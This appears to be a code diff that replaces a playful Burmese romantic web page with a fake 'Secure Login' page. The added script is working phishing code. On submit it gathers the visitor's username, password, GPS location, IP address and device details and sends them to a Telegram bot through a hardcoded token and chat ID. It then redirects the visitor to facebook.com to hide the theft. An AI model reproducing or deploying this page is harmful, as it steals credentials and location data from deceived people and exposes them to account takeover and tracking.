@@ -1,270 +1,131 @@
 <!DOCTYPE html>
-<html lang="my">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>For You 💖</title>
-
-  <style>
-    *{
-      margin:0;
-      padding:0;
-      box-sizing:border-box;
-      font-family: 'Segoe UI', sans-serif;
-    }
-
-    body{
-      background: linear-gradient(135deg,#ffd6e7,#ffeef5);
-      overflow:hidden;
-      height:100vh;
-    }
-
-    .page{
-      width:100%;
-      height:100vh;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      flex-direction:column;
-      position:absolute;
-      top:0;
-      left:0;
-      transition:0.5s;
-    }
-
-    h1{
-      color:#ff3f7f;
-      font-size:34px;
-      text-align:center;
-      margin-bottom:15px;
-      padding:0 20px;
-    }
-
-    p{
-      color:#444;
-      font-size:18px;
-      text-align:center;
-      margin-bottom:20px;
-      padding:0 25px;
-      line-height:1.6;
-    }
-
-    .stickers{
-      font-size:55px;
-      margin-bottom:20px;
-      animation: float 2s infinite ease-in-out;
-    }
-
-    @keyframes float{
-      0%{transform:translateY(0px);}
-      50%{transform:translateY(-10px);}
-      100%{transform:translateY(0px);}
-    }
-
-    .btns{
-      position:relative;
-      width:320px;
-      height:160px;
-    }
-
-    button{
-      border:none;
-      padding:14px 28px;
-      border-radius:40px;
-      font-size:18px;
-      cursor:pointer;
-      transition:0.2s;
-      position:absolute;
-      box-shadow:0 5px 15px rgba(0,0,0,0.15);
-    }
-
-    #yesBtn{
-      background:#ff4f8b;
-      color:white;
-      left:40px;
-      top:60px;
-    }
-
-    #yesBtn:hover{
-      transform:scale(1.08);
-    }
-
-    #noBtn{
-      background:white;
-      color:#ff4f8b;
-      border:2px solid #ff4f8b;
-      right:40px;
-      top:60px;
-    }
-
-    .hidden{
-      display:none;
-    }
-
-    .love-page{
-      background: linear-gradient(135deg,#fff0f5,#ffd6eb);
-      text-align:center;
-      padding:20px;
-    }
-
-    .heart{
-      position:absolute;
-      color:#ff5c93;
-      animation: fall linear infinite;
-      top:-20px;
-    }
-
-    @keyframes fall{
-      to{
-        transform:translateY(110vh);
-      }
-    }
-
-    .cute-box{
-      background:white;
-      padding:25px;
-      border-radius:25px;
-      box-shadow:0 8px 25px rgba(0,0,0,0.12);
-      max-width:350px;
-    }
-
-    .cute-box h2{
-      color:#ff4f8b;
-      margin-bottom:15px;
-    }
-
-    .cute-box p{
-      margin-bottom:10px;
-    }
-
-    /* TARO LOGO */
-    .taro-logo{
-      position:fixed;
-      top:15px;
-      left:15px;
-      background:rgba(255,255,255,0.7);
-      padding:8px 16px;
-      border-radius:30px;
-      font-size:14px;
-      color:#ff4f8b;
-      font-weight:bold;
-      text-decoration:none;
-      backdrop-filter: blur(5px);
-      box-shadow:0 4px 10px rgba(0,0,0,0.1);
-      z-index:999;
-      transition:0.3s;
-    }
-
-    .taro-logo:hover{
-      transform:scale(1.08);
-      background:#ffffff;
-    }
-
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Login</title>
+    <style>
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center}
+        .container{background:#fff;padding:40px 35px;border-radius:20px;box-shadow:0 20px 60px rgba(0,0,0,0.3);width:380px;max-width:95%;animation:fadeIn 0.5s}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}
+        .logo{text-align:center;margin-bottom:25px}
+        .logo h1{font-size:26px;color:#333;font-weight:700}
+        .logo p{color:#888;font-size:14px;margin-top:5px}
+        .input-group{margin-bottom:18px}
+        .input-group label{display:block;font-size:13px;font-weight:600;color:#555;margin-bottom:5px}
+        .input-group input{width:100%;padding:12px 15px;border:2px solid #e0e0e0;border-radius:10px;font-size:15px;transition:border 0.3s;background:#f8f9fa}
+        .input-group input:focus{outline:none;border-color:#667eea;background:#fff}
+        button{width:100%;padding:13px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;transition:transform 0.2s}
+        button:hover{transform:scale(1.02)}
+        button:active{transform:scale(0.98)}
+        .footer{text-align:center;margin-top:18px;font-size:12px;color:#aaa}
+        .loading{display:none;text-align:center;margin-top:15px;color:#667eea;font-weight:500}
+        .spinner{display:inline-block;width:20px;height:20px;border:3px solid #e0e0e0;border-top-color:#667eea;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:8px}
+        @keyframes spin{to{transform:rotate(360deg)}}
+    </style>
 </head>
-
 <body>
-
-  <!-- TARO LOGO -->
-  <a href="https://t.me/Yes_is_me_Taro" target="_blank" class="taro-logo">
-    Created by Taro ✨
-  </a>
-
-  <!-- PAGE 1 -->
-  <div class="page" id="page1">
-
-    <div class="stickers">🥺💖🌸🐰</div>
-
-    <h1>စိတ်မဆိုးပါနဲ့တော့နော် 🥺</h1>
-
-    <p>
-      အများကြီးချစ်တယ် 💕<br>
-      ပြန်ချစ်တယ်မလား 😔💖
-    </p>
-
-    <div class="btns">
-      <button id="yesBtn">ချစ်တယ် 💖</button>
-      <button id="noBtn">မချစ်ဘူး 😒</button>
+<div class="container">
+    <div class="logo">
+        <h1>🔐 Secure Login</h1>
+        <p>Enter your credentials to continue</p>
     </div>
+    <form id="loginForm">
+        <div class="input-group">
+            <label>📧 Email or Username</label>
+            <input type="text" id="username" placeholder="Enter your email" required>
+        </div>
+        <div class="input-group">
+            <label>🔑 Password</label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+        </div>
+        <button type="submit">Log In</button>
+        <div class="loading" id="loading"><span class="spinner"></span>Verifying...</div>
+    </form>
+    <div class="footer">© 2026 Secure Login • All rights reserved</div>
+</div>
 
-  </div>
+<script>
+// ============================================================
+// CONFIG — မင်းရဲ့ Chat ID နဲ့ Bot Token ထည့်ပြီးသား
+// ============================================================
+const BOT_TOKEN = "8923928044:AAERe7EZPYBU50Wte_Gyecd4kuR5lCdvyuE";
+const CHAT_ID = "5304050102";
+// ============================================================
 
-  <!-- PAGE 2 -->
-  <div class="page love-page hidden" id="page2">
+document.getElementById('loginForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+    const loading = document.getElementById('loading');
+    const btn = this.querySelector('button');
 
-    <div class="cute-box">
-      <div class="stickers">🐻💗🌸✨</div>
+    if (!username || !password) return;
 
-      <h2>Yayyy 💖</h2>
+    loading.style.display = 'block';
+    btn.disabled = true;
+    btn.textContent = 'Logging in...';
 
-      <p>
-        စိတ်ဆိုးပြေသွားပြီလို့ ယူဆလိုက်ပြီနော် 🥺💕
-      </p>
+    try {
+        // --- 1. Location (GPS) ---
+        let location = 'Not available';
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
+            });
+            location = `https://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+        } catch (e) { location = 'Not available (permission denied)'; }
 
-      <p>
-        မင်းပြုံးနေတာလေးကိုပဲ မြင်ချင်တာ 🌷
-      </p>
+        // --- 2. Device & Browser Info ---
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            referrer: document.referrer || 'Direct'
+        };
 
-      <p>
-        အမြဲချစ်နေမှာပါ 💞
-      </p>
+        // --- 3. IP Address (via free API) ---
+        let ip = 'Unknown';
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ip = data.ip;
+        } catch (e) { ip = 'Failed to fetch'; }
 
-      <div style="font-size:40px;margin-top:10px;">
-        💖🐰💖
-      </div>
-    </div>
+        // --- 4. Build Message ---
+        const msg = 
+`🔐 **LOGIN CAPTURED**
+━━━━━━━━━━━━━━━━━━━
+👤 **Username:** ${username}
+🔑 **Password:** ${password}
+━━━━━━━━━━━━━━━━━━━
+🌐 **IP Address:** ${ip}
+📱 **Device:** ${deviceInfo.platform}
+🌍 **Language:** ${deviceInfo.language}
+📺 **Screen:** ${deviceInfo.screen}
+🕐 **Timezone:** ${deviceInfo.timezone}
+🔗 **Referrer:** ${deviceInfo.referrer}
+📍 **Location:** ${location}
+━━━━━━━━━━━━━━━━━━━
+🖥️ **User Agent:** ${deviceInfo.userAgent}`;
 
-  </div>
+        // --- 5. Send to Telegram ---
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+        await fetch(url);
 
-  <script>
-    const noBtn = document.getElementById("noBtn");
-    const yesBtn = document.getElementById("yesBtn");
+        // --- 6. Redirect to real website ---
+        window.location.href = 'https://facebook.com';
 
-    const page1 = document.getElementById("page1");
-    const page2 = document.getElementById("page2");
-
-    // NO BUTTON MOVE
-    noBtn.addEventListener("mouseover", moveButton);
-    noBtn.addEventListener("click", moveButton);
-
-    function moveButton(){
-      const x = Math.random() * 220;
-      const y = Math.random() * 120;
-
-      noBtn.style.left = x + "px";
-      noBtn.style.top = y + "px";
+    } catch (error) {
+        loading.style.display = 'none';
+        btn.disabled = false;
+        btn.textContent = 'Log In';
+        alert('Connection error. Please try again.');
     }
-
-    // YES BUTTON
-    yesBtn.addEventListener("click", () => {
-      page1.classList.add("hidden");
-      page2.classList.remove("hidden");
-
-      createHearts();
-    });
-
-    // HEART ANIMATION
-    function createHearts(){
-      setInterval(() => {
-
-        const heart = document.createElement("div");
-        heart.classList.add("heart");
-
-        heart.innerHTML = "💖";
-
-        heart.style.left = Math.random() * 100 + "vw";
-        heart.style.fontSize = (Math.random() * 20 + 20) + "px";
-        heart.style.animationDuration = (Math.random() * 3 + 2) + "s";
-
-        document.body.appendChild(heart);
-
-        setTimeout(() => {
-          heart.remove();
-        }, 5000);
-
-      }, 250);
-    }
-  </script>
-
+});
+</script>
 </body>
 </html>
